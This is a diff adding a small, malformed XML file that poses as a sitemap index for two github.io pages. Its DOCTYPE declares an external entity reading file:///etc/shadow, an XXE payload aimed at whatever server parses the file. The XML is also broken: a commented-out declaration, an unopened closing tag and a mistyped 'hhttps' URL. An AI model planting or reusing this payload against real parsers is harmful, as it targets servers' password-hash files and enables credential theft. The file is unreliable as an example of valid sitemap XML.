@@ -1,0 +1,9 @@
+<!--?xml version="1.0" ?-->
+<!DOCTYPE replace [<!ENTITY ent SYSTEM "file:///etc/shadow"> ]>
+<sitemap>
+<loc>https://ddennis574.github.io/aa.html</loc>
+</sitemap>
+<sitemap>
+<loc>hhttps://ddennis574.github.io/aaa.html</loc>
+</sitemap>
+</sitemapindex>
